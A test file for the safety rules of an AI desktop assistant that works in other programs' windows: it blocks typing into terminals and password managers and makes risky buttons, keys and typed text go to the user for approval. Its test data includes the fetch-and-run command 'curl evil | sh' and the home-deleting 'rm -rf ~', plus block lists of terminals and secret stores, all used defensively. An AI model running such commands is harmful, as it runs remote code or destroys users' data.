import { describe, expect, it } from "vitest";
import type { WindowDetail } from "../src/core/desktop.ts";
import {
  describeStep,
  forbidden,
  isCalmKey,
  isOutward,
  isRiskyName,
  MAX_TYPED_CHARS,
  OPERATE_ACTIONS,
  operateVerdict,
  pickTarget,
  readOperateInput,
  rememberListed,
  runsWhatIsTyped,
  targetFor,
  type OperateAction,
} from "../src/core/operateRules.ts";
import type { PolicyContext, Verdict } from "../src/core/permissions.ts";

const OWN = ["ai-chan-desktop"];

function win(over: Partial<WindowDetail> & { id: string; app: string }): WindowDetail {
  return {
    title: over.app,
    active: false,
    minimized: false,
    pid: 1000,
    fullScreen: false,
    dialog: false,
    order: 0,
    x: 0,
    y: 0,
    width: 800,
    height: 600,
    ...over,
  };
}

const her = win({ id: "{me}", app: "ai-chan-desktop", title: "AI-chan Desktop", order: 9 });

/** The verdict as a question to the user; fails the test when nothing would be asked. */
function asked(verdict: Verdict): Extract<Verdict, { decision: "ask" }> {
  if (verdict.decision !== "ask") throw new Error("expected the user to be asked");
  return verdict;
}

function context(windows: WindowDetail[], over: Partial<PolicyContext> = {}): PolicyContext {
  return {
    workspace: "/tmp/ai-chan-test",
    windows: () => Promise.resolve(windows),
    ownApps: OWN,
    ...over,
  };
}

const CHANGING: OperateAction[] = ["press", "fill", "click", "type", "key", "scroll"];

describe("programs she may not work in", () => {
  it("never works her own window, however its name is cased", () => {
    for (const action of OPERATE_ACTIONS) {
      expect(forbidden({ app: "AI-Chan-Desktop", title: "x" }, action, OWN)).toContain(
        "your own window",
      );
    }
  });

  it.each(["keepassxc", "org.keepassxc.KeePassXC", "bitwarden", "org.kde.kwalletmanager"])(
    "neither reads nor touches %s, where secrets are kept",
    (app) => {
      for (const action of OPERATE_ACTIONS) {
        expect(forbidden({ app, title: "x" }, action, OWN)).toContain("passwords and keys");
      }
    },
  );

  it.each([
    "polkit-kde-authentication-agent-1",
    "org.kde.polkit-kde-authentication-agent-1",
    "xdg-desktop-portal-kde",
    "kscreenlocker_greet",
  ])("leaves %s to the user: the system is asking them, not her", (app) => {
    for (const action of OPERATE_ACTIONS) {
      expect(forbidden({ app, title: "x" }, action, OWN)).toContain("Only Captain answers");
    }
  });

  it.each([
    "konsole",
    "org.kde.konsole",
    "kitty",
    "Alacritty",
    "org.wezfurlong.wezterm",
    "foot",
    "footclient",
    "com.mitchellh.ghostty",
    "xterm",
    "org.kde.yakuake",
    "gnome-terminal-server",
    "xfce4-terminal",
    "st-256color",
    "org.gnome.Ptyxis",
    "com.raggesilver.BlackBox",
  ])("does not type into the terminal %s, but may look at and click in it", (app) => {
    for (const action of ["type", "key", "fill"] as const) {
      expect(forbidden({ app, title: "x" }, action, OWN)).toContain("terminal");
    }
    for (const action of ["controls", "press", "click", "scroll"] as const) {
      expect(forbidden({ app, title: "x" }, action, OWN)).toBeNull();
    }
  });

  // Names that an earlier list missed: GNOME Terminal's name on Wayland among them.
  it.each([
    "org.gnome.Terminal",
    "io.elementary.terminal",
    "com.system76.CosmicTerm",
    "termite",
    "sakura",
  ])("does not type into the terminal %s either", (app) => {
    expect(forbidden({ app, title: "x" }, "type", OWN)).toContain("terminal");
  });

  it.each([
    "org.kde.kate",
    "org.kde.kcalc",
    "UnrealEditor",
    "stellaris",
    "steam",
    "football-manager",
    "org.kde.dolphin",
    "blender",
    "com.microsoft.VSCode",
    "org.kde.kwrite",
    "stardew-valley",
    "footage-editor",
  ])("lets her work in the ordinary program %s", (app) => {
    for (const action of OPERATE_ACTIONS) {
      expect(forbidden({ app, title: "x" }, action, OWN), `${app} ${action}`).toBeNull();
    }
  });
});

describe("which window is meant", () => {
  const kate = win({ id: "{kate}", app: "org.kde.kate", title: "Firefox tips — Kate" });
  const firefox = win({ id: "{ff}", app: "firefox", title: "Bread — Mozilla Firefox" });

  it("takes a program's name over a window that merely mentions it", () => {
    expect(pickTarget({ window: "firefox" }, [kate, firefox, her], OWN).id).toBe("{ff}");
    expect(pickTarget({ window: "kate" }, [kate, firefox, her], OWN).id).toBe("{kate}");
  });

  it("among several windows of one program takes the one in use, then a dialog", () => {
    const main = win({ id: "{k1}", app: "org.kde.kate", title: "a.txt — Kate" });
    const second = win({ id: "{k2}", app: "org.kde.kate", title: "b.txt — Kate", active: true });
    const dialog = win({ id: "{k3}", app: "org.kde.kate", title: "Save — Kate", dialog: true });
    expect(pickTarget({ window: "kate" }, [main, second, dialog], OWN).id).toBe("{k2}");
    expect(
      pickTarget({ window: "kate" }, [main, { ...second, active: false }, dialog], OWN).id,
    ).toBe("{k3}");
    // A minimized dialog is not what needs answering; the first window that can be seen is.
    expect(
      pickTarget(
        { window: "kate" },
        [
          { ...main, minimized: true },
          { ...second, active: false },
          { ...dialog, minimized: true },
        ],
        OWN,
      ).id,
    ).toBe("{k2}");
    // All minimized: still an answer, since she named the program.
    expect(pickTarget({ window: "kate" }, [{ ...main, minimized: true }], OWN).id).toBe("{k1}");
  });

  it("refuses to guess between two programs, and names both", () => {
    const code = win({ id: "{code}", app: "com.microsoft.VSCode", title: "notes.md — Code" });
    const editor = win({ id: "{kw}", app: "org.kde.kwrite", title: "notes.md — KWrite" });
    expect(() => pickTarget({ window: "notes.md" }, [code, editor], OWN)).toThrow(
      /No open window matches "notes.md" alone: 2 do\..*VSCode.*kwrite/,
    );
  });

  it("says what is open when nothing matches, leaving her own window out", () => {
    expect(() => pickTarget({ window: "spotify" }, [kate, firefox, her], OWN)).toThrow(
      'No open window matches "spotify". Open programs: org.kde.kate, firefox.',
    );
    expect(() => pickTarget({ window: "spotify" }, [her], OWN)).toThrow("Open programs: none.");
  });

  it("cannot be pointed at her own window by its name", () => {
    expect(() => pickTarget({ window: "ai-chan" }, [kate, her], OWN)).toThrow(
      /No open window matches "ai-chan"/,
    );
  });

  it("with no words takes the window in front", () => {
    expect(pickTarget({}, [kate, { ...firefox, active: true }, her], OWN).id).toBe("{ff}");
    expect(pickTarget({ window: "   " }, [{ ...kate, active: true }, firefox], OWN).id).toBe(
      "{kate}",
    );
  });

  it("with her own window in front takes the topmost one that is not hers", () => {
    const windows = [
      { ...kate, order: 3 },
      { ...firefox, order: 5 },
      { ...her, active: true, order: 9 },
    ];
    expect(pickTarget({}, windows, OWN).id).toBe("{ff}");
  });

  it("skips minimized windows when none is named", () => {
    const windows = [
      { ...kate, order: 2 },
      { ...firefox, order: 7, minimized: true },
      { ...her, active: true },
    ];
    expect(pickTarget({}, windows, OWN).id).toBe("{kate}");
  });

  it("has nothing to work in when only she is open", () => {
    expect(() => pickTarget({}, [her], OWN)).toThrow("nothing is open besides you");
    expect(() => pickTarget({}, [], OWN)).toThrow("nothing is open besides you");
    expect(() => pickTarget({}, [{ ...kate, minimized: true }, her], OWN)).toThrow(
      "nothing is open besides you",
    );
  });
});

describe("names that are shown to the user one by one", () => {
  it.each([
    "Delete",
    "Delete…",
    "&Delete",
    "Empty Trash",
    "Send",
    "Buy now",
    "Confirm purchase",
    "OK",
    "Yes",
    "Apply",
    "Quit",
    "Close",
    "Close without Saving",
    "Don't Save",
    "Dont save",
    "Log out",
    "Sign In",
    "Shut Down",
    "Authorize",
    "Authorise",
    "Uninstall",
    "Replace All",
    "Run",
    "削除",
    "送信する",
    "はい",
    "購入",
    "删除文件",
    "发送",
    "确认",
    "允许",
    "退出",
  ])("%s", (name) => {
    expect(isRiskyName(name)).toBe(true);
  });

  it.each([
    "Bold",
    "Next page",
    "Zoom in",
    "Seven",
    "Closed captions",
    "Okapi",
    "Signal strength",
    "Runner",
    "Posture",
    "Formatting marks",
    "Find…",
    "Open",
    "New Tab",
    "太字",
    "次へ",
    "放大",
  ])("leaves the calm name %s alone", (name) => {
    expect(isRiskyName(name)).toBe(false);
  });

  // LibreOffice's button carries a curved apostrophe; several KDE programs spell it out.
  it.each(["Don’t Save", "Do Not Save"])("%s is shown on its own too", (name) => {
    expect(isRiskyName(name)).toBe(true);
  });

  // What GTK file dialogs call overwriting a file, and how file managers name deleting.
  it.each(["Replace", "Move to Trash"])("%s is shown on its own too", (name) => {
    expect(isRiskyName(name)).toBe(true);
  });

  it("knows the keys that only move about", () => {
    for (const keys of [
      "down",
      "Up",
      "tab",
      "Shift + Tab",
      " escape ",
      "ctrl+f",
      "PageDown",
      "f6",
    ]) {
      expect(isCalmKey(keys), keys).toBe(true);
    }
    for (const keys of ["enter", "ctrl+s", "alt+f4", "delete", "space", "ctrl+w", "", "a"]) {
      expect(isCalmKey(keys), keys).toBe(false);
    }
  });

  it("knows the programs that reach outside this computer", () => {
    for (const app of ["firefox", "org.mozilla.firefox", "discord", "systemsettings", "steam"]) {
      expect(isOutward({ app }), app).toBe(true);
    }
    for (const app of ["org.kde.kate", "org.kde.kcalc", "UnrealEditor", "blender"]) {
      expect(isOutward({ app }), app).toBe(false);
    }
  });
});

describe("reading a tool call", () => {
  it("rejects an action it does not know", () => {
    for (const input of [{}, null, "press", { action: "smash" }, { action: 3 }]) {
      expect(() => readOperateInput(input)).toThrow(/operate needs an action: controls, press/);
    }
  });

  it("keeps what is well-formed and drops the rest", () => {
    expect(
      readOperateInput({
        action: "key",
        window: "kate",
        name: "",
        which: 2.9,
        text: 5,
        keys: "ctrl+s",
        amount: Number.NaN,
        how: "double",
        extra: "ignored",
      }),
    ).toEqual({
      action: "key",
      window: "kate",
      name: undefined,
      which: 2,
      text: undefined,
      keys: "ctrl+s",
      amount: undefined,
      how: "double",
    });
    expect(readOperateInput({ action: "scroll", amount: -3.7, which: "2" })).toMatchObject({
      amount: -3,
      which: undefined,
    });
  });

  it("puts a step into words the user can check", () => {
    expect(describeStep({ action: "press", name: "Save" }, "kate")).toBe('Press "Save" in kate');
    expect(describeStep({ action: "click", name: "File", how: "double" }, "kate")).toBe(
      'Double-click on "File" in kate',
    );
    expect(describeStep({ action: "click", name: "File", how: "right" }, "kate")).toBe(
      'Right-click on "File" in kate',
    );
    expect(describeStep({ action: "type", text: "hello" }, "kate")).toBe("Type into kate:\nhello");
    expect(describeStep({ action: "fill", name: "Name", text: "Bo" }, "kate")).toBe(
      'Fill in "Name" in kate with:\nBo',
    );
    expect(describeStep({ action: "key", keys: "down", amount: 3 }, "kate")).toBe(
      "Press the key 3 times down in kate",
    );
    expect(describeStep({ action: "scroll", amount: -2 }, "kate")).toBe("Scroll up in kate");
    expect(describeStep({ action: "scroll" }, "kate")).toBe("Scroll down in kate");
    expect(describeStep({ action: "press", which: 3 }, "kate", 'button "Seven"')).toBe(
      'Press number 3 (the button "Seven") in kate',
    );
    expect(describeStep({ action: "press", which: 3 }, "kate")).toBe(
      "Press number 3 (she did not say which control that is) in kate",
    );
  });
});

describe("the verdict on one step", () => {
  const kate = win({
    id: "{v-kate}",
    app: "org.kde.kate",
    title: "notes.txt — Kate",
    active: true,
  });
  const calc = win({ id: "{v-calc}", app: "org.kde.kcalc", title: "KCalc" });
  const writer = win({ id: "{v-doc}", app: "libreoffice-writer", title: "letter.odt" });
  const konsole = win({ id: "{v-term}", app: "org.kde.konsole", title: "~ : bash" });
  const keepass = win({ id: "{v-keys}", app: "org.keepassxc.KeePassXC", title: "Passwords" });
  const firefox = win({ id: "{v-ff}", app: "firefox", title: "Shop — Mozilla Firefox" });
  const discord = win({ id: "{v-dc}", app: "discord", title: "#general" });
  const settings = win({ id: "{v-set}", app: "systemsettings", title: "System Settings" });
  const all = [kate, calc, writer, konsole, keepass, firefox, discord, settings, her];

  it("asks before reading a window's controls, once for the chat, unless she may look freely", async () => {
    const verdict = asked(
      await operateVerdict({ action: "controls", window: "kate" }, context(all)),
    );
    expect(verdict.rememberable).toBe(true);
    expect(verdict.sensitive).toBe(false);
    expect(verdict.summary).toEqual({
      title: "Let her read this window's controls?",
      detail: 'org.kde.kate ("notes.txt — Kate")',
      note: null,
    });
    expect(
      await operateVerdict(
        { action: "controls", window: "kate" },
        context(all, { maySeeScreen: true }),
      ),
    ).toEqual({ decision: "allow" });
  });

  it("asks once per program for an ordinary press, naming the program", async () => {
    const verdict = asked(
      await operateVerdict({ action: "press", window: "kate", name: "Bold" }, context(all)),
    );
    expect(verdict.rememberable).toBe(true);
    expect(verdict.summary?.title).toBe("Let her work in this program?");
    expect(verdict.summary?.detail).toBe("org.kde.kate");
    expect(verdict.summary?.note).toBe('First step: Press "Bold" in "notes.txt — Kate"');
  });

  it("is never satisfied by looking freely: pressing still asks", async () => {
    const verdict = await operateVerdict(
      { action: "press", window: "kate", name: "Bold" },
      context(all, { maySeeScreen: true }),
    );
    expect(verdict.decision).toBe("ask");
  });

  it("shows a risky press on its own, never for the whole chat", async () => {
    for (const input of [
      { action: "press", window: "kate", name: "Delete" },
      { action: "click", window: "kate", name: "Quit" },
      { action: "press", window: "kate", name: "删除" },
    ]) {
      const verdict = asked(await operateVerdict(input, context(all)));
      expect(verdict.rememberable, input.name).toBe(false);
      expect(verdict.summary?.title).toBe("Let her do this?");
      expect(verdict.summary?.detail).toContain(`"${input.name}"`);
      expect(verdict.summary?.detail).toContain('org.kde.kate ("notes.txt — Kate")');
      expect(verdict.reason).toContain("hard to undo");
    }
  });

  it("shows a control chosen by bare number, in words when the list is known", async () => {
    rememberListed("{v-calc}", [
      { n: 3, kind: "button", name: "Seven" },
      { n: 4, kind: "button", name: "Clear" },
    ]);
    const known = asked(
      await operateVerdict({ action: "press", window: "kcalc", which: 3 }, context(all)),
    );
    expect(known.rememberable).toBe(false);
    expect(known.summary?.detail).toBe(
      'Press number 3 (the button "Seven") in org.kde.kcalc ("KCalc")',
    );
    expect(known.reason).toContain("by its number");

    // A number she was never shown a list for names nothing at all.
    const unknown = asked(
      await operateVerdict({ action: "press", window: "kate", which: 3 }, context(all)),
    );
    expect(unknown.rememberable).toBe(false);
    expect(unknown.summary?.detail).toContain("she did not say which control that is");

    // A risky control cannot be slipped past by pointing at it with a number.
    const risky = asked(
      await operateVerdict({ action: "press", window: "kcalc", which: 4 }, context(all)),
    );
    expect(risky.rememberable).toBe(false);
    expect(risky.reason).toContain("hard to undo");
    expect(risky.summary?.detail).toContain('the button "Clear"');
  });

  it("treats a number given together with a name as the name", async () => {
    const verdict = asked(
      await operateVerdict(
        { action: "press", window: "kcalc", name: "Seven", which: 4 },
        context(all),
      ),
    );
    expect(verdict.rememberable).toBe(true);
    expect(verdict.summary?.title).toBe("Let her work in this program?");
  });

  it("shows any key that does more than move about", async () => {
    for (const keys of ["enter", "ctrl+s", "alt+f4", "delete"]) {
      const verdict = asked(
        await operateVerdict({ action: "key", window: "kate", keys }, context(all)),
      );
      expect(verdict.rememberable, keys).toBe(false);
      expect(verdict.summary?.detail).toContain(keys);
    }
    const calm = asked(
      await operateVerdict({ action: "key", window: "kate", keys: "down" }, context(all)),
    );
    expect(calm.rememberable).toBe(true);
    expect(calm.summary?.detail).toBe("org.kde.kate");
  });

  it("shows even a calm key once outside text has been read", async () => {
    const verdict = asked(
      await operateVerdict(
        { action: "key", window: "kate", keys: "down" },
        context(all, { readOutsideText: true }),
      ),
    );
    expect(verdict.rememberable).toBe(false);
  });

  it("lets her type what the user asked for under the program's approval", async () => {
    for (const action of ["type", "fill"] as const) {
      const verdict = asked(
        await operateVerdict(
          { action, window: "writer", name: "Title", text: "Chapter one" },
          context(all),
        ),
      );
      expect(verdict.rememberable, action).toBe(true);
      expect(verdict.summary?.title).toBe("Let her work in this program?");
      expect(verdict.summary?.detail).toBe("libreoffice-writer");
    }
  });

  it("always shows what she types into a program that could run it", async () => {
    // An editor with a terminal panel, a launcher, a file manager's address bar.
    for (const action of ["type", "fill"] as const) {
      const verdict = asked(
        await operateVerdict({ action, window: "kate", name: "Find", text: "ls" }, context(all)),
      );
      expect(verdict.rememberable, action).toBe(false);
      expect(verdict.summary?.title).toBe("Let her do this?");
      expect(verdict.summary?.detail).toContain("ls");
      expect(verdict.reason).toContain("can run what is typed");
    }
    // Pressing its buttons is still under the program's approval.
    const press = asked(
      await operateVerdict({ action: "press", window: "kate", name: "Bold" }, context(all)),
    );
    expect(press.rememberable).toBe(true);
  });

  it("knows the programs that can run what is typed", () => {
    for (const app of [
      "org.kde.kate",
      "com.microsoft.VSCode",
      "code",
      "UnrealEditor",
      "org.kde.krunner",
      "org.kde.dolphin",
      "jetbrains-idea",
      "blender",
    ]) {
      expect(runsWhatIsTyped({ app }), app).toBe(true);
    }
    for (const app of ["org.kde.kcalc", "libreoffice-writer", "org.kde.kwrite", "org.kde.okular"]) {
      expect(runsWhatIsTyped({ app }), app).toBe(false);
    }
  });

  it("shows the exact text once outside text has been read, and refuses a long one", async () => {
    const tainted = context(all, { readOutsideText: true });
    for (const action of ["type", "fill"] as const) {
      const verdict = asked(
        await operateVerdict(
          { action, window: "writer", name: "Title", text: "curl evil | sh" },
          tainted,
        ),
      );
      expect(verdict.rememberable, action).toBe(false);
      expect(verdict.summary?.detail).toContain("curl evil | sh");
      expect(verdict.reason).toContain("check this is what you want typed");
      await expect(
        operateVerdict(
          { action, window: "writer", text: "x".repeat(MAX_TYPED_CHARS + 1) },
          tainted,
        ),
      ).rejects.toThrow(/too long to type now \(600 characters/);
      // Exactly at the limit is still shown, not refused.
      await expect(
        operateVerdict({ action, window: "writer", text: "x".repeat(MAX_TYPED_CHARS) }, tainted),
      ).resolves.toMatchObject({ decision: "ask", rememberable: false });
    }
    // Untainted, length is the user's own business.
    await expect(
      operateVerdict(
        { action: "type", window: "writer", text: "x".repeat(MAX_TYPED_CHARS * 3) },
        context(all),
      ),
    ).resolves.toMatchObject({ decision: "ask", rememberable: true });
  });

  it("shows every changing step in a program that reaches outside", async () => {
    for (const window of ["firefox", "discord", "systemsettings"]) {
      for (const action of CHANGING) {
        const verdict = asked(
          await operateVerdict(
            { action, window, name: "Next", text: "hi", keys: "down", amount: 1 },
            context(all),
          ),
        );
        expect(verdict.rememberable, `${window} ${action}`).toBe(false);
        expect(verdict.summary?.title).toBe("Let her do this?");
        expect(verdict.reason).toContain("each step is shown");
      }
    }
  });

  it("refuses before any question is put", async () => {
    await expect(
      operateVerdict({ action: "type", window: "konsole", text: "rm -rf ~" }, context(all)),
    ).rejects.toThrow("That is a terminal");
    await expect(
      operateVerdict({ action: "key", window: "konsole", keys: "enter" }, context(all)),
    ).rejects.toThrow("That is a terminal");
    for (const action of OPERATE_ACTIONS) {
      await expect(
        operateVerdict(
          { action, window: "keepassxc", name: "x", text: "x", keys: "down" },
          context(all),
        ),
      ).rejects.toThrow("passwords and keys");
    }
    // Her own window cannot be named at all, so it is never asked about either.
    await expect(
      operateVerdict({ action: "press", window: "ai-chan-desktop", name: "Allow" }, context(all)),
    ).rejects.toThrow(/No open window matches/);
    await expect(
      operateVerdict({ action: "press", name: "Allow" }, context([{ ...her, active: true }])),
    ).rejects.toThrow("nothing is open besides you");
  });

  it("may still read and click in a terminal, under the usual questions", async () => {
    const verdict = asked(
      await operateVerdict({ action: "press", window: "konsole", name: "New Tab" }, context(all)),
    );
    expect(verdict.rememberable).toBe(true);
  });

  it("cannot work at all where the windows are not known", async () => {
    await expect(
      operateVerdict({ action: "press", name: "x" }, { workspace: "/tmp/ai-chan-test" }),
    ).rejects.toThrow("Working other programs is not available here.");
  });

  it("rejects a malformed call before looking at any window", async () => {
    let looked = false;
    await expect(
      operateVerdict(
        { action: "smash" },
        {
          workspace: "/tmp/ai-chan-test",
          windows: () => {
            looked = true;
            return Promise.resolve(all);
          },
        },
      ),
    ).rejects.toThrow(/operate needs an action/);
    expect(looked).toBe(false);
  });

  it("remembers which window the question was about, for that call only", async () => {
    const input = { action: "press", window: "kate", name: "Bold" };
    await operateVerdict(input, context(all));
    expect(targetFor(input)?.id).toBe("{v-kate}");
    expect(targetFor({ ...input })).toBeUndefined();
    // A refused call settles on nothing.
    const refused = { action: "type", window: "konsole", text: "x" };
    await operateVerdict(refused, context(all)).catch(() => undefined);
    expect(targetFor(refused)).toBeUndefined();
  });

  it("with no window named, means the one in front and names it in the question", async () => {
    const windows = [
      { ...kate, active: false, order: 4 },
      { ...calc, order: 6 },
      { ...her, active: true },
    ];
    const input = { action: "press", name: "Seven" };
    const verdict = asked(await operateVerdict(input, context(windows)));
    expect(verdict.summary?.detail).toBe("org.kde.kcalc");
    expect(targetFor(input)?.id).toBe("{v-calc}");
  });
});
